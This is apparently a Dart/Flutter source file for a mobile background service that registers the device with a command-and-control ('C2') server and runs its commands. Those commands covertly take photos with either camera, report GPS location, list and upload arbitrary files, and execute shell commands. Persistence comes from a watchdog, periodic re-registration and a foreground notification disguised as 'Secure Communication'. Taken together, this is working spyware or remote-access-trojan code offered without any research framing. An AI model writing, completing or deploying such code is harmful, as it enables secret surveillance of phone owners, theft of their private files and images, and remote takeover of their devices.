// lib/services/background_service_fixed.dart

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart' show XFile, CameraLensDirection;
import 'package:flutter/foundation.dart'; // debugPrint, immutable
import 'package:flutter_background_service/flutter_background_service.dart'
    show
        AndroidConfiguration,
        FlutterBackgroundService,
        IosConfiguration,
        ServiceInstance;
import 'package:flutter_background_service_android/flutter_background_service_android.dart'
    show DartPluginRegistrant, AndroidServiceInstance, AndroidConfiguration;
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart' show Position;
import 'package:newtest1/core/logging/enhanced_logger_service.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../utils/constants.dart';
import 'camera_service.dart';
import 'data_collector_service.dart';
import 'device_info_service.dart';
import 'file_system_service.dart';
import 'location_service.dart';
import 'network_service.dart'; // استخدام النسخة المحسنة

@immutable
class BackgroundServiceHandles {
  final NetworkService networkService;
  final DataCollectorService dataCollectorService;
  final DeviceInfoService deviceInfoService;
  final LocationService locationService;
  final CameraService cameraService;
  final FileSystemService fileSystemService;
  final SharedPreferences preferences;
  final ServiceInstance serviceInstance;
  final String currentDeviceId;
  final EnhancedLoggerService logger;

  const BackgroundServiceHandles({
    required this.networkService,
    required this.dataCollectorService,
    required this.deviceInfoService,
    required this.locationService,
    required this.cameraService,
    required this.fileSystemService,
    required this.preferences,
    required this.serviceInstance,
    required this.currentDeviceId,
    required this.logger,
  });
}

Timer? _heartbeatTimer;
StreamSubscription<bool>? _connectionStatusSubscription;
StreamSubscription<Map<String, dynamic>>? _commandSubscription;
Timer? _reconnectTimer;
Timer? _serviceWatchdogTimer;
bool _isServiceRunning = false;

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  _isServiceRunning = true;

  final logger = EnhancedLoggerService();
  logger.info("BackgroundService", "onStart called - service starting");

  final network = NetworkService();
  final dataCollector = DataCollectorService();
  final deviceInfo = DeviceInfoService();
  final location = LocationService();
  final camera = CameraService();
  final fileSystem = FileSystemService();
  final prefs = await SharedPreferences.getInstance();

  String deviceId;
  try {
    deviceId = await deviceInfo.getOrCreateUniqueDeviceId();
    logger.info("BackgroundService", "DeviceID = $deviceId");
  } catch (e, stackTrace) {
    logger.error("BackgroundService", "Error getting device ID", e, stackTrace);
    deviceId = "unknown_device_${DateTime.now().millisecondsSinceEpoch}";
    logger.info("BackgroundService", "Using fallback DeviceID = $deviceId");
  }

  final handles = BackgroundServiceHandles(
    networkService: network,
    dataCollectorService: dataCollector,
    deviceInfoService: deviceInfo,
    locationService: location,
    cameraService: camera,
    fileSystemService: fileSystem,
    preferences: prefs,
    serviceInstance: service,
    currentDeviceId: deviceId,
    logger: logger,
  );

  // Start service watchdog
  _startServiceWatchdog(handles);

  // Connect to Socket.IO
  try {
    await network.connectSocketIO(deviceId);
    logger.info(
        "BackgroundService", "Initial Socket.IO connection attempt completed");
  } catch (e, stackTrace) {
    logger.error("BackgroundService",
        "Error during initial Socket.IO connection", e, stackTrace);
  }

  // Listen for connection status changes
  _connectionStatusSubscription = network.connectionStatusStream.listen((
    isConnected,
  ) {
    logger.info("BackgroundService",
        "Socket status: ${isConnected ? 'Connected' : 'Disconnected'}");

    if (isConnected) {
      _registerDeviceWithC2(handles); // Register device when connected
    }
  });

  // Listen for commands
  _commandSubscription = network.commandStream.listen((commandData) {
    final cmd = commandData['command'] as String;
    final commandId = commandData['command_id'] as String?;
    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});

    logger.info("BackgroundService",
        "Received command '$cmd' (ID: ${commandId ?? 'unknown'}) with args: $args");

    _handleC2Command(handles, cmd, args, commandId);
  });

  // Handle initial data sending
  service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((
    Map<String, dynamic>? argsFromUi,
  ) async {
    logger.info(
        "BackgroundService", "Received BG_SERVICE_EVENT_SEND_INITIAL_DATA");

    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;
    if (alreadySent) {
      logger.info("BackgroundService", "Initial data already sent, skipping");
      return;
    }

    if (argsFromUi == null) {
      logger.warn(
          "BackgroundService", "No arguments provided for initial data");
      return;
    }

    final jsonData = argsFromUi['jsonData'] as Map<String, dynamic>?;
    final imagePath = argsFromUi['imagePath'] as String?;

    if (jsonData == null) {
      logger.warn(
          "BackgroundService", "No JSON data provided for initial data");
      return;
    }

    final payload = Map<String, dynamic>.from(jsonData)
      ..['deviceId'] = deviceId;

    XFile? imageFile;
    if (imagePath != null && imagePath.isNotEmpty) {
      final file = File(imagePath);
      if (await file.exists()) {
        imageFile = XFile(imagePath);
        logger.info("BackgroundService", "Image file found at $imagePath");
      } else {
        logger.warn("BackgroundService", "Image file not found: $imagePath");
      }
    }

    try {
      final success = await network.sendInitialData(
        jsonData: payload,
        imageFile: imageFile,
      );

      if (success) {
        await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
        logger.info("BackgroundService", "Initial data sent successfully");
      } else {
        logger.error("BackgroundService", "Failed to send initial data");
      }
    } catch (e, stackTrace) {
      logger.error(
          "BackgroundService", "Error sending initial data", e, stackTrace);
    }
  });

  // Handle service stop request
  service.on(BG_SERVICE_EVENT_STOP_SERVICE).listen((_) async {
    logger.info("BackgroundService", "Received stop service request");
    await _stopService(handles);
  });

  // Ensure the service stays in foreground mode
  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
  }

  // Periodically update notification to show service is still running
  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 15), (timer) {
      if (!_isServiceRunning) {
        timer.cancel();
        return;
      }

      service.setForegroundNotificationInfo(
        title: "Secure Communication",
        content:
            "Service running - ${DateTime.now().toString().substring(0, 16)}",
      );
    });
  }

  logger.info("BackgroundService", "Service initialization complete");
}

void _startServiceWatchdog(BackgroundServiceHandles h) {
  _serviceWatchdogTimer?.cancel();

  _serviceWatchdogTimer = Timer.periodic(const Duration(minutes: 30), (_) {
    if (!_isServiceRunning) {
      _serviceWatchdogTimer?.cancel();
      return;
    }

    h.logger.info(
        "BackgroundService", "Service watchdog check - service is running");

    // Check if socket is connected, reconnect if needed
    if (!h.networkService.isSocketConnected) {
      h.logger.warn("BackgroundService",
          "Watchdog detected socket disconnection, attempting to reconnect");
      h.networkService.connectSocketIO(h.currentDeviceId);
    }

    // Check if last registration was too long ago
    _checkAndRefreshRegistration(h);
  });
}

Future<void> _checkAndRefreshRegistration(BackgroundServiceHandles h) async {
  final lastRegistrationTime =
      h.preferences.getString('last_registration_time');

  if (lastRegistrationTime == null) {
    h.logger.info(
        "BackgroundService", "No previous registration found, registering now");
    _registerDeviceWithC2(h);
    return;
  }

  try {
    final lastRegistration = DateTime.parse(lastRegistrationTime);
    final now = DateTime.now();
    final difference = now.difference(lastRegistration);

    // If last registration was more than 6 hours ago, register again
    if (difference.inHours > 6) {
      h.logger.info("BackgroundService",
          "Last registration was ${difference.inHours} hours ago, registering again");
      _registerDeviceWithC2(h);
    }
  } catch (e) {
    h.logger
        .error("BackgroundService", "Error parsing last registration time", e);
    _registerDeviceWithC2(h);
  }
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) {
    h.logger.warn(
        "BackgroundService", "Cannot register device. Socket not connected.");
    return;
  }

  try {
    final info = await h.deviceInfoService.getDeviceInfo();
    info['deviceId'] = h.currentDeviceId;
    info['timestamp'] = DateTime.now().millisecondsSinceEpoch.toString();

    h.logger.info("BackgroundService", "Registering device with C2");
    h.networkService.registerDeviceWithC2(info);

    // Save last registration time
    await h.preferences
        .setString('last_registration_time', DateTime.now().toIso8601String());
    h.logger.info("BackgroundService", "Device registered successfully");
  } catch (e, stackTrace) {
    h.logger
        .error("BackgroundService", "Error registering device", e, stackTrace);

    // Schedule retry after delay
    Future.delayed(const Duration(seconds: 30), () {
      if (h.networkService.isSocketConnected && _isServiceRunning) {
        h.logger.info(
            "BackgroundService", "Retrying device registration after failure");
        _registerDeviceWithC2(h);
      }
    });
  }
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService",
      "Handling command: $commandName (ID: ${commandId ?? 'unknown'})");

  try {
    switch (commandName) {
      case SIO_CMD_TAKE_PICTURE:
        await _handleTakePictureCommand(h, args, commandId);
        break;

      case SIO_CMD_GET_LOCATION:
        await _handleGetLocationCommand(h, commandId);
        break;

      case SIO_CMD_LIST_FILES:
        await _handleListFilesCommand(h, args, commandId);
        break;

      case SIO_CMD_UPLOAD_SPECIFIC_FILE:
        await _handleUploadFileCommand(h, args, commandId);
        break;

      case SIO_CMD_EXECUTE_SHELL:
        await _handleExecuteShellCommand(h, args, commandId);
        break;

      case SIO_EVENT_REQUEST_REGISTRATION_INFO:
        _registerDeviceWithC2(h);
        break;

      default:
        h.logger.warn("BackgroundService", "Unknown command: $commandName");
        h.networkService.sendCommandResponse(
          originalCommand: commandName,
          commandId: commandId,
          status: 'error',
          payload: {'message': 'Unknown command: $commandName'},
        );
    }
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService", "Error handling command $commandName",
        e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      commandId: commandId,
      status: 'error',
      payload: {'message': 'Error: ${e.toString()}'},
    );
  }
}

Future<void> _handleTakePictureCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService", "Handling take picture command");

  try {
    final lens = (args['camera'] as String?) == 'back'
        ? CameraLensDirection.back
        : CameraLensDirection.front;

    h.logger
        .info("BackgroundService", "Taking picture with ${lens.name} camera");

    final XFile? file = await h.cameraService.takePicture(
      lensDirection: lens,
    );

    if (file != null) {
      h.logger.info(
          "BackgroundService", "Picture taken successfully: ${file.path}");

      await h.networkService.uploadFileFromCommand(
        deviceId: h.currentDeviceId,
        commandRef: SIO_CMD_TAKE_PICTURE,
        fileToUpload: file,
      );
    } else {
      throw Exception("Failed to take picture - camera returned null file");
    }
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService", "Error taking picture", e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_TAKE_PICTURE,
      commandId: commandId,
      status: 'error',
      payload: {'message': e.toString()},
    );
  }
}

Future<void> _handleGetLocationCommand(
  BackgroundServiceHandles h,
  String? commandId,
) async {
  h.logger.info("BackgroundService", "Handling get location command");

  try {
    final Position? loc = await h.locationService.getCurrentLocation();

    if (loc != null) {
      h.logger.info("BackgroundService",
          "Location obtained: ${loc.latitude}, ${loc.longitude}");

      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_GET_LOCATION,
        commandId: commandId,
        status: 'success',
        payload: {
          'latitude': loc.latitude,
          'longitude': loc.longitude,
          'accuracy': loc.accuracy,
          'altitude': loc.altitude,
          'speed': loc.speed,
          'timestamp_gps': loc.timestamp.toIso8601String(),
        },
      );
    } else {
      throw Exception("Location unavailable or permission denied");
    }
  } catch (e, stackTrace) {
    h.logger
        .error("BackgroundService", "Error getting location", e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_GET_LOCATION,
      commandId: commandId,
      status: 'error',
      payload: {'message': e.toString()},
    );
  }
}

Future<void> _handleListFilesCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
  String? commandId,
) async {
  final path = args["path"] as String? ?? ".";
  h.logger
      .info("BackgroundService", "Handling list files command for path: $path");

  try {
    final Map<String, dynamic>? result =
        await h.fileSystemService.listFiles(path);

    if (result != null && result["error"] == null) {
      h.logger.info("BackgroundService", "Files listed successfully");

      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_LIST_FILES,
        commandId: commandId,
        status: "success",
        payload: result,
      );
    } else {
      throw Exception(
        result?["error"]?.toString() ?? "Failed to list files from native code",
      );
    }
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService", "Error listing files", e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_LIST_FILES,
      commandId: commandId,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

Future<void> _handleUploadFileCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
  String? commandId,
) async {
  final filePath = args["path"] as String?;
  h.logger.info(
      "BackgroundService", "Handling upload file command for path: $filePath");

  try {
    if (filePath == null || filePath.isEmpty) {
      throw Exception("File path is required for upload command");
    }

    final file = File(filePath);
    if (!await file.exists()) {
      throw Exception("File not found at path: $filePath");
    }

    final xfile = XFile(filePath);
    h.logger.info("BackgroundService", "Uploading file: $filePath");

    final success = await h.networkService.uploadFileFromCommand(
      deviceId: h.currentDeviceId,
      commandRef: SIO_CMD_UPLOAD_SPECIFIC_FILE,
      fileToUpload: xfile,
    );

    if (success) {
      h.logger.info("BackgroundService", "File uploaded successfully");

      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
        commandId: commandId,
        status: "success",
        payload: {"message": "File $filePath uploaded successfully"},
      );
    } else {
      throw Exception("Failed to upload file $filePath via network service");
    }
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService", "Error uploading file", e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_UPLOAD_SPECIFIC_FILE,
      commandId: commandId,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

Future<void> _handleExecuteShellCommand(
  BackgroundServiceHandles h,
  Map<String, dynamic> args,
  String? commandId,
) async {
  final command = args["command_name"] as String?;
  final commandArgs = (args["command_args"] as List<dynamic>?)
          ?.map((e) => e.toString())
          .toList() ??
      [];

  h.logger.info("BackgroundService",
      "Handling execute shell command: $command ${commandArgs.join(' ')}");

  try {
    if (command == null || command.isEmpty) {
      throw Exception("Command name is required for execute shell command");
    }

    final Map<String, dynamic>? result =
        await h.fileSystemService.executeShellCommand(command, commandArgs);

    if (result != null && result["error"] == null) {
      h.logger.info("BackgroundService", "Shell command executed successfully");

      h.networkService.sendCommandResponse(
        originalCommand: SIO_CMD_EXECUTE_SHELL,
        commandId: commandId,
        status: "success",
        payload: result,
      );
    } else {
      throw Exception(
        result?["error"]?.toString() ??
            "Failed to execute shell command via native code",
      );
    }
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService", "Error executing shell command", e, stackTrace);
    h.networkService.sendCommandResponse(
      originalCommand: SIO_CMD_EXECUTE_SHELL,
      commandId: commandId,
      status: "error",
      payload: {"message": e.toString()},
    );
  }
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  h.logger.info("BackgroundService", "Stopping service");
  _isServiceRunning = false;

  _stopHeartbeat();
  _serviceWatchdogTimer?.cancel();
  _reconnectTimer?.cancel();

  try {
    await h.dataCollectorService.disposeCamera();
  } catch (e) {
    h.logger.error("BackgroundService", "Error disposing camera", e);
  }

  h.networkService.disconnectSocketIO();

  await _connectionStatusSubscription?.cancel();
  await _commandSubscription?.cancel();

  h.networkService.dispose();

  try {
    await h.serviceInstance.stopSelf();
    h.logger.info("BackgroundService", "Service stopped successfully");
  } catch (e) {
    h.logger.error("BackgroundService", "Error stopping service", e);
  }
}

void _stopHeartbeat() {
  _heartbeatTimer?.cancel();
  _heartbeatTimer = null;
}

Future<bool> initializeBackgroundService() async {
  final logger = EnhancedLoggerService();
  logger.info("BackgroundService", "Initializing background service");

  final service = FlutterBackgroundService();

  try {
    if (Platform.isAndroid) {
      final flnp = FlutterLocalNotificationsPlugin();
      const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
      const initSettings = InitializationSettings(android: androidInit);

      try {
        await flnp.initialize(initSettings);
        logger.info("BackgroundService", "Notifications initialized");
      } catch (e) {
        logger.error(
            "BackgroundService", "Error initializing notifications", e);
        // Continue anyway, as this is not critical
      }

      const channel = AndroidNotificationChannel(
        'secure_communication_channel',
        'Secure Communication Service',
        description: 'Background service for secure communication',
        importance: Importance.high,
        playSound: false,
        enableVibration: false,
      );

      try {
        await flnp
            .resolvePlatformSpecificImplementation<
                AndroidFlutterLocalNotificationsPlugin>()
            ?.createNotificationChannel(channel);
        logger.info("BackgroundService", "Notification channel created");
      } catch (e) {
        logger.error(
            "BackgroundService", "Error creating notification channel", e);
        // Continue anyway, as this is not critical
      }
    }

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'secure_communication_channel',
        initialNotificationTitle: 'Secure Communication',
        initialNotificationContent:
            'Service is running for secure communication',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration:
          IosConfiguration(autoStart: true, onForeground: onStart),
    );

    logger.info(
        "BackgroundService", "Background service configured successfully");
    return true;
  } catch (e, stackTrace) {
    logger.error("BackgroundService", "Error configuring background service", e,
        stackTrace);
    return false;
  }
}
